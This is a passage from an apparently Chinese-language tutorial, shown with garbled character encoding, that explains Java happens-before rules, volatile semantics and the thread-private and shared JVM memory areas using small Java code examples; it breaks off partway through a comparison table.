<p><strong>æ³¨æ„ï¼š</strong> happens-beforeä¸ç­‰äºæ—¶é—´å…ˆåé¡ºåºï¼Œä½†å¦‚æœæœ‰happens-beforeå…³ç³»ï¼Œåˆ™ä¿è¯å¯è§æ€§ã€‚</p>
<p><strong>ä¸»è¦çš„happens-beforeè§„åˆ™ï¼š</strong></p>
<ol>
<li><strong>ç¨‹åºé¡ºåºè§„åˆ™</strong>ï¼šåŒä¸€çº¿ç¨‹å†…ï¼Œå‰é¢çš„æ“ä½œhappens-beforeåé¢çš„æ“ä½œ</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">// æ“ä½œ1</span>
<span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> x + <span class="hljs-number">1</span>;  <span class="hljs-comment">// æ“ä½œ2ï¼šæ“ä½œ1 happens-before æ“ä½œ2</span>
</code></pre>
<ol start="2">
<li><strong>ç›‘è§†å™¨é”è§„åˆ™</strong>ï¼šè§£é”æ“ä½œhappens-beforeåŠ é”æ“ä½œ</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">synchronized</span> (lock) {
    x = <span class="hljs-number">1</span>;  <span class="hljs-comment">// æ“ä½œ1</span>
}  <span class="hljs-comment">// è§£é”</span>

<span class="hljs-keyword">synchronized</span> (lock) {  <span class="hljs-comment">// åŠ é”ï¼šè§£é” happens-before åŠ é”</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> x;  <span class="hljs-comment">// èƒ½çœ‹åˆ°x=1</span>
}
</code></pre>
<ol start="3">
<li><strong>volatileå˜é‡è§„åˆ™</strong>ï¼švolatileå†™æ“ä½œhappens-before volatileè¯»æ“ä½œ</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-comment">// çº¿ç¨‹1</span>
flag = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å†™æ“ä½œ</span>

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-keyword">if</span> (flag) {  <span class="hljs-comment">// è¯»æ“ä½œï¼šå†™ happens-before è¯»</span>
    <span class="hljs-comment">// èƒ½ç«‹å³çœ‹åˆ°flag=true</span>
}
</code></pre>
<ol start="4">
<li><strong>ä¼ é€’æ€§è§„åˆ™</strong>ï¼šå¦‚æœA happens-before Bï¼ŒB happens-before Cï¼Œåˆ™A happens-before C</li>
</ol>
<h4 data-id="heading-6">1.4 volatileå…³é”®å­—ï¼ˆç®€è¦ï¼‰</h4>
<p><strong>volatileçš„ç‰¹æ€§ï¼š</strong></p>
<ol>
<li><strong>ä¿è¯å¯è§æ€§</strong>ï¼švolatileå˜é‡å¯¹æ‰€æœ‰çº¿ç¨‹ç«‹å³å¯è§</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// ä¿è¯å¯è§æ€§</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFlag</span><span class="hljs-params">()</span> {
    flag = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// ä¿®æ”¹åç«‹å³å¯¹æ‰€æœ‰çº¿ç¨‹å¯è§</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">getFlag</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> flag;  <span class="hljs-comment">// èƒ½ç«‹å³çœ‹åˆ°æœ€æ–°å€¼</span>
}
</code></pre>
<ol start="2">
<li><strong>ç¦æ­¢æŒ‡ä»¤é‡æ’åº</strong>ï¼švolatileå˜é‡çš„è¯»å†™æ“ä½œä¸ä¼šè¢«é‡æ’åº</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ready</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">()</span> {
    value = <span class="hljs-number">42</span>;    <span class="hljs-comment">// æ“ä½œ1</span>
    ready = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// æ“ä½œ2ï¼šä¸ä¼šè¢«é‡æ’åºåˆ°æ“ä½œ1ä¹‹å‰</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">read</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (ready) {           <span class="hljs-comment">// æ“ä½œ3</span>
        System.out.println(value);  <span class="hljs-comment">// èƒ½ä¿è¯çœ‹åˆ°value=42</span>
    }
}
</code></pre>
<ol start="3">
<li><strong>ä¸ä¿è¯åŸå­æ€§</strong>ï¼švolatileä¸èƒ½ä¿è¯å¤åˆæ“ä½œçš„åŸå­æ€§</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// è¿™ä¸æ˜¯åŸå­æ“ä½œï¼</span>
    <span class="hljs-comment">// ç›¸å½“äºï¼š</span>
    <span class="hljs-comment">// int temp = count;</span>
    <span class="hljs-comment">// temp = temp + 1;</span>
    <span class="hljs-comment">// count = temp;</span>
    <span class="hljs-comment">// è¿™ä¸‰ä¸ªæ“ä½œä¹‹é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æ‰“æ–­</span>
}
</code></pre>
<p><strong>æ­£ç¡®åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨synchronized</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// ä¿è¯åŸå­æ€§</span>
}

<span class="hljs-comment">// æˆ–ä½¿ç”¨AtomicInteger</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();  <span class="hljs-comment">// åŸå­æ“ä½œ</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-7">ç¬¬äºŒéƒ¨åˆ†ï¼šJVMå†…å­˜åŒºåŸŸæ•´ä½“æ¶æ„ï¼ˆå›¾è¡¨+è¯¦è§£ï¼‰</h2>
<h3 data-id="heading-8">2. JVMå†…å­˜åŒºåŸŸæ•´ä½“æ¶æ„å›¾</h3>
<h4 data-id="heading-9">2.1 æ•´ä½“æ¶æ„å›¾ï¼ˆé‡ç‚¹ï¼‰</h4>
<pre><code class="hljs language-scss" lang="scss">JVMå†…å­˜åŒºåŸŸæ•´ä½“æ¶æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç¨‹åºè®¡æ•°å™¨ (ç§æœ‰)   â”‚
â”‚  è™šæ‹Ÿæœºæ ˆ (ç§æœ‰)     â”‚
â”‚  æœ¬åœ°æ–¹æ³•æ ˆ (ç§æœ‰)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    Javaå † (å…±äº«)     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚æ–°ç”Ÿä»£â”‚  â”‚è€å¹´ä»£â”‚  â”‚
â”‚  â”‚ Eden â”‚  â”‚     â”‚  â”‚
â”‚  â”‚ S0S1 â”‚  â”‚     â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   æ–¹æ³•åŒº (å…±äº«)      â”‚
â”‚  è¿è¡Œæ—¶å¸¸é‡æ±         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ç›´æ¥å†…å­˜ (å †å¤–)    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>æ¶æ„è¯´æ˜ï¼š</strong></p>
<p>JVMå†…å­˜åŒºåŸŸåˆ†ä¸ºä¸¤å¤§ç±»ï¼š</p>
<ol>
<li>
<p><strong>çº¿ç¨‹ç§æœ‰åŒºåŸŸ</strong>ï¼ˆæ¯ä¸ªçº¿ç¨‹ç‹¬ç«‹ï¼‰ï¼š</p>
<ul>
<li>ç¨‹åºè®¡æ•°å™¨</li>
<li>è™šæ‹Ÿæœºæ ˆ</li>
<li>æœ¬åœ°æ–¹æ³•æ ˆ</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹å…±äº«åŒºåŸŸ</strong>ï¼ˆæ‰€æœ‰çº¿ç¨‹å…±äº«ï¼‰ï¼š</p>
<ul>
<li>Javaå †</li>
<li>æ–¹æ³•åŒº</li>
</ul>
</li>
<li>
<p><strong>ç›´æ¥å†…å­˜</strong>ï¼ˆå †å¤–å†…å­˜ï¼‰ï¼š</p>
<ul>
<li>NIOä½¿ç”¨ï¼Œä¸å±äºJVMè¿è¡Œæ—¶æ•°æ®åŒº</li>
</ul>
</li>
</ol>
<h4 data-id="heading-10">2.2 å†…å­˜åŒºåŸŸåˆ†ç±»è¯´æ˜</h4>
<p><strong>çº¿ç¨‹ç§æœ‰åŒºåŸŸï¼š</strong></p>
<p>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ç§æœ‰åŒºåŸŸï¼Œç§æœ‰åŒºåŸŸéšç€çº¿ç¨‹çš„åˆ›å»ºè€Œåˆ›å»ºï¼Œéšç€çº¿ç¨‹çš„é”€æ¯è€Œé”€æ¯ã€‚</p>
<ul>
<li><strong>ç¨‹åºè®¡æ•°å™¨</strong>ï¼šè®°å½•å½“å‰çº¿ç¨‹æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤åœ°å€</li>
<li><strong>è™šæ‹Ÿæœºæ ˆ</strong>ï¼šå­˜å‚¨å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°ç­‰</li>
<li><strong>æœ¬åœ°æ–¹æ³•æ ˆ</strong>ï¼šä¸ºNativeæ–¹æ³•æœåŠ¡</li>
</ul>
<p><strong>çº¿ç¨‹å…±äº«åŒºåŸŸï¼š</strong></p>
<p>æ‰€æœ‰çº¿ç¨‹å…±äº«åŒä¸€å—å†…å­˜åŒºåŸŸï¼Œå…±äº«åŒºåŸŸåœ¨JVMå¯åŠ¨æ—¶åˆ›å»ºï¼ŒJVMå…³é—­æ—¶é”€æ¯ã€‚</p>
<ul>
<li><strong>Javaå †</strong>ï¼šå­˜å‚¨å¯¹è±¡å®ä¾‹å’Œæ•°ç»„</li>
<li><strong>æ–¹æ³•åŒº</strong>ï¼šå­˜å‚¨ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ç­‰</li>
</ul>
<h4 data-id="heading-11">2.3 çº¿ç¨‹ç§æœ‰åŒºåŸŸä¸å…±äº«åŒºåŸŸçš„åŒºåˆ«å’Œä½œç”¨</h4>
<h5 data-id="heading-12">2.3.1 çº¿ç¨‹ç§æœ‰åŒºåŸŸ</h5>
<p><strong>å®šä¹‰ï¼š</strong></p>
<p>çº¿ç¨‹ç§æœ‰åŒºåŸŸæ˜¯æ¯ä¸ªçº¿ç¨‹ç‹¬ç«‹æ‹¥æœ‰çš„å†…å­˜åŒºåŸŸï¼Œçº¿ç¨‹ä¹‹é—´æ— æ³•è®¿é—®å¯¹æ–¹çš„ç§æœ‰åŒºåŸŸã€‚ç§æœ‰åŒºåŸŸéšç€çº¿ç¨‹çš„åˆ›å»ºè€Œåˆ›å»ºï¼Œéšç€çº¿ç¨‹çš„é”€æ¯è€Œé”€æ¯ã€‚</p>
<p><strong>åŒ…å«çš„åŒºåŸŸï¼š</strong></p>
<ul>
<li>ç¨‹åºè®¡æ•°å™¨</li>
<li>Javaè™šæ‹Ÿæœºæ ˆ</li>
<li>æœ¬åœ°æ–¹æ³•æ ˆ</li>
</ul>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ol>
<li>
<p><strong>å­˜å‚¨çº¿ç¨‹ç§æœ‰çš„æ•°æ®</strong></p>
<ul>
<li>å±€éƒ¨å˜é‡ï¼šæ–¹æ³•å†…éƒ¨çš„å˜é‡</li>
<li>æ–¹æ³•å‚æ•°ï¼šæ–¹æ³•çš„å‚æ•°</li>
<li>è¿”å›å€¼ï¼šæ–¹æ³•çš„è¿”å›å€¼</li>
<li>ä¸­é—´ç»“æœï¼šè®¡ç®—è¿‡ç¨‹ä¸­çš„ä¸´æ—¶æ•°æ®</li>
</ul>
</li>
<li>
<p><strong>è®°å½•çº¿ç¨‹çš„æ‰§è¡ŒçŠ¶æ€</strong></p>
<ul>
<li>å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤ä½ç½®ï¼ˆç¨‹åºè®¡æ•°å™¨ï¼‰</li>
<li>æ–¹æ³•è°ƒç”¨æ ˆï¼ˆè™šæ‹Ÿæœºæ ˆï¼‰</li>
<li>å¼‚å¸¸å¤„ç†ä¿¡æ¯</li>
</ul>
</li>
<li>
<p><strong>ä¿è¯çº¿ç¨‹å®‰å…¨</strong></p>
<ul>
<li>çº¿ç¨‹ç§æœ‰ï¼Œæ— éœ€åŒæ­¥</li>
<li>å¤©ç„¶çº¿ç¨‹å®‰å…¨</li>
<li>é¿å…æ•°æ®ç«äº‰</li>
</ul>
</li>
</ol>
<p><strong>å·¥ä½œæœºåˆ¶ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">çº¿ç¨‹ç§æœ‰åŒºåŸŸï¼š

çº¿ç¨‹1: <span class="hljs-section">[ç¨‹åºè®¡æ•°å™¨]</span> <span class="hljs-section">[è™šæ‹Ÿæœºæ ˆ]</span> <span class="hljs-section">[æœ¬åœ°æ–¹æ³•æ ˆ]</span>
çº¿ç¨‹2: <span class="hljs-section">[ç¨‹åºè®¡æ•°å™¨]</span> <span class="hljs-section">[è™šæ‹Ÿæœºæ ˆ]</span> <span class="hljs-section">[æœ¬åœ°æ–¹æ³•æ ˆ]</span>
çº¿ç¨‹3: <span class="hljs-section">[ç¨‹åºè®¡æ•°å™¨]</span> <span class="hljs-section">[è™šæ‹Ÿæœºæ ˆ]</span> <span class="hljs-section">[æœ¬åœ°æ–¹æ³•æ ˆ]</span>

æ¯ä¸ªçº¿ç¨‹çš„ç§æœ‰åŒºåŸŸå®Œå…¨ç‹¬ç«‹
</code></pre>
<p><strong>å®é™…ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrivateAreaExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å±€éƒ¨å˜é‡å­˜å‚¨åœ¨ç§æœ‰åŒºåŸŸï¼ˆè™šæ‹Ÿæœºæ ˆï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">localVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;  <span class="hljs-comment">// æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„localVarå‰¯æœ¬</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"test"</span>;  <span class="hljs-comment">// å¯¹è±¡å¼•ç”¨åœ¨æ ˆä¸­ï¼Œå¯¹è±¡æœ¬èº«åœ¨å †ä¸­</span>
    }
}

<span class="hljs-comment">// å¤šçº¿ç¨‹æ‰§è¡Œ</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">PrivateAreaExample</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivateAreaExample</span>();
    obj.method();  <span class="hljs-comment">// çº¿ç¨‹1æœ‰è‡ªå·±çš„æ ˆï¼Œå­˜å‚¨è‡ªå·±çš„localVar</span>
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">PrivateAreaExample</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivateAreaExample</span>();
    obj.method();  <span class="hljs-comment">// çº¿ç¨‹2æœ‰è‡ªå·±çš„æ ˆï¼Œå­˜å‚¨è‡ªå·±çš„localVar</span>
});

<span class="hljs-comment">// ä¸¤ä¸ªçº¿ç¨‹çš„localVarå®Œå…¨ç‹¬ç«‹ï¼Œäº’ä¸å½±å“</span>
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ol>
<li><strong>çº¿ç¨‹é—´éš”ç¦»</strong>ï¼šæ¯ä¸ªçº¿ç¨‹çš„ç§æœ‰åŒºåŸŸå®Œå…¨ç‹¬ç«‹ï¼Œäº’ä¸å½±å“</li>
<li><strong>è®¿é—®é€Ÿåº¦å¿«</strong>ï¼šæ— éœ€åŒæ­¥æœºåˆ¶ï¼Œç›´æ¥è®¿é—®ï¼Œé€Ÿåº¦å¿«</li>
<li><strong>å†…å­˜å ç”¨</strong>ï¼šå†…å­˜å ç”¨ä¸çº¿ç¨‹æ•°æˆæ­£æ¯”ï¼ˆæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„æ ˆï¼‰</li>
</ol>
<h5 data-id="heading-13">2.3.2 çº¿ç¨‹å…±äº«åŒºåŸŸ</h5>
<p><strong>å®šä¹‰ï¼š</strong></p>
<p>çº¿ç¨‹å…±äº«åŒºåŸŸæ˜¯æ‰€æœ‰çº¿ç¨‹å…±äº«çš„å†…å­˜åŒºåŸŸï¼Œå…±äº«åŒºåŸŸåœ¨JVMå¯åŠ¨æ—¶åˆ›å»ºï¼ŒJVMå…³é—­æ—¶é”€æ¯ã€‚æ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥è®¿é—®å…±äº«åŒºåŸŸã€‚</p>
<p><strong>åŒ…å«çš„åŒºåŸŸï¼š</strong></p>
<ul>
<li>Javaå †ï¼šå­˜å‚¨å¯¹è±¡å®ä¾‹å’Œæ•°ç»„</li>
<li>æ–¹æ³•åŒºï¼šå­˜å‚¨ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ç­‰ï¼ˆåŒ…æ‹¬è¿è¡Œæ—¶å¸¸é‡æ± ï¼‰</li>
</ul>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ol>
<li>
<p><strong>å­˜å‚¨å…±äº«æ•°æ®</strong></p>
<ul>
<li>å¯¹è±¡å®ä¾‹ï¼šæ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥è®¿é—®çš„å¯¹è±¡</li>
<li>ç±»ä¿¡æ¯ï¼šç±»çš„å…ƒæ•°æ®ï¼Œæ‰€æœ‰çº¿ç¨‹å…±äº«</li>
<li>å¸¸é‡ï¼šå­—ç¬¦ä¸²å¸¸é‡ç­‰</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹é—´é€šä¿¡</strong></p>
<ul>
<li>çº¿ç¨‹é€šè¿‡å…±äº«åŒºåŸŸè¿›è¡Œæ•°æ®äº¤æ¢</li>
<li>ä¸€ä¸ªçº¿ç¨‹åˆ›å»ºçš„å¯¹è±¡ï¼Œå…¶ä»–çº¿ç¨‹å¯ä»¥é€šè¿‡å¼•ç”¨è®¿é—®</li>
</ul>
</li>
<li>
<p><strong>èµ„æºå…±äº«</strong></p>
<ul>
<li>å¤šä¸ªçº¿ç¨‹å…±äº«åŒä¸€ä¸ªå¯¹è±¡</li>
<li>å¤šä¸ªçº¿ç¨‹å…±äº«åŒä¸€ä¸ªç±»ä¿¡æ¯</li>
<li>æé«˜å†…å­˜åˆ©ç”¨ç‡</li>
</ul>
</li>
</ol>
<p><strong>å·¥ä½œæœºåˆ¶ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">çº¿ç¨‹å…±äº«åŒºåŸŸï¼š

     <span class="hljs-selector-attr">[Javaå †]</span> <span class="hljs-selector-attr">[æ–¹æ³•åŒº]</span>
        â†‘      â†‘
        â”‚      â”‚
   â”Œâ”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”
   â”‚    â”‚      â”‚  â”‚
çº¿ç¨‹<span class="hljs-number">1</span>  çº¿ç¨‹<span class="hljs-number">2</span>  çº¿ç¨‹<span class="hljs-number">3</span>

æ‰€æœ‰çº¿ç¨‹å…±äº«å †å’Œæ–¹æ³•åŒº
</code></pre>
<p><strong>å®é™…ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SharedAreaExample</span> {
    <span class="hljs-comment">// é™æ€å˜é‡å­˜å‚¨åœ¨æ–¹æ³•åŒºï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">sharedCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// æ‰€æœ‰çº¿ç¨‹å…±äº«</span>
    
    <span class="hljs-comment">// å®ä¾‹å˜é‡å­˜å‚¨åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">instanceCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­ï¼Œæ‰€æœ‰çº¿ç¨‹å¯ä»¥é€šè¿‡å¼•ç”¨è®¿é—®</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è®¿é—®å…±äº«å˜é‡ï¼Œéœ€è¦åŒæ­¥</span>
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            sharedCount++;  <span class="hljs-comment">// æ‰€æœ‰çº¿ç¨‹å…±äº«åŒä¸€ä¸ªsharedCount</span>
            instanceCount++;
        }
    }
}

<span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹å…±äº«åŒä¸€ä¸ªå¯¹è±¡</span>
<span class="hljs-type">SharedAreaExample</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedAreaExample</span>();  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    shared.increment();  <span class="hljs-comment">// çº¿ç¨‹1è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    shared.increment();  <span class="hljs-comment">// çº¿ç¨‹2ä¹Ÿè®¿é—®åŒä¸€ä¸ªå¯¹è±¡</span>
});

<span class="hljs-comment">// ä¸¤ä¸ªçº¿ç¨‹å…±äº«åŒä¸€ä¸ªsharedå¯¹è±¡ï¼Œéœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</span>
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ol>
<li><strong>çº¿ç¨‹é—´å…±äº«</strong>ï¼šæ‰€æœ‰çº¿ç¨‹å¯ä»¥è®¿é—®åŒä¸€ä¸ªå…±äº«åŒºåŸŸ</li>
<li><strong>éœ€è¦åŒæ­¥æœºåˆ¶</strong>ï¼šå¤šä¸ªçº¿ç¨‹è®¿é—®å…±äº«æ•°æ®æ—¶ï¼Œéœ€è¦ä½¿ç”¨synchronizedã€volatileç­‰æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</li>
<li><strong>å†…å­˜å ç”¨</strong>ï¼šå†…å­˜å ç”¨ä¸å¯¹è±¡æ•°é‡ç›¸å…³ï¼Œä¸çº¿ç¨‹æ•°æ— å…³</li>
<li><strong>GCçš„ä¸»è¦åŒºåŸŸ</strong>ï¼šå…±äº«åŒºåŸŸæ˜¯åƒåœ¾å›æ”¶çš„ä¸»è¦åŒºåŸŸ</li>
</ol>
<h5 data-id="heading-14">2.3.3 ä¸¤è€…çš„åŒºåˆ«å¯¹æ¯”</h5>


















































<table><thead><tr><th>ç‰¹æ€§</th><th>çº¿ç¨‹ç§æœ‰åŒºåŸŸ</th><th>çº¿ç¨‹å…±äº«åŒºåŸŸ</th></tr></thead><tbody><tr><td><strong>ç”Ÿå‘½å‘¨æœŸ</strong></td><td>ä¸çº¿ç¨‹ç›¸åŒï¼Œçº¿ç¨‹åˆ›å»ºæ—¶åˆ›å»ºï¼Œçº¿ç¨‹é”€æ¯æ—¶é”€æ¯</td><td>ä¸JVMç›¸åŒï¼ŒJVMå¯åŠ¨æ—¶åˆ›å»ºï¼ŒJVMå…³é—­æ—¶é”€æ¯</td></tr><tr><td><strong>è®¿é—®æ–¹å¼</strong></td><td>çº¿ç¨‹ç‹¬ç«‹è®¿é—®ï¼Œæ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„åŒºåŸŸ</td><td>æ‰€æœ‰çº¿ç¨‹å…±äº«è®¿é—®åŒä¸€ä¸ªåŒºåŸŸ</td></tr><tr><td><strong>çº¿ç¨‹å®‰å…¨</strong></td><td>å¤©ç„¶çº¿ç¨‹å®‰å…¨ï¼Œæ— éœ€åŒæ­¥æœºåˆ¶</td><td>éœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</td></tr><tr><td><strong>å­˜å‚¨å†…å®¹</strong></td><td>å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°ã€è¿”å›å€¼ç­‰</td><td>å¯¹è±¡å®ä¾‹ã€ç±»ä¿¡æ¯ã€å¸¸é‡ç­‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>ä¸çº¿ç¨‹æ•°æˆæ­£æ¯”ï¼ˆæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰æ ˆï¼‰</td><td>ä¸å¯¹è±¡æ•°ç›¸å…³ï¼Œä¸çº¿ç¨‹æ•°æ— å…³</td></tr><tr><td><strong>GCå½±å“</strong></td><td>ä¸æ¶‰åŠGCï¼Œçº¿ç¨‹é”€æ¯æ—¶è‡ªåŠ¨å›æ”¶</td><td>GCçš„ä¸»è¦åŒºåŸŸï¼Œéœ€è¦åƒåœ¾å›æ”¶</td></tr><tr><td><strong>è®¿é—®é€Ÿåº¦</strong></td><td>å¿«é€Ÿï¼Œæ— 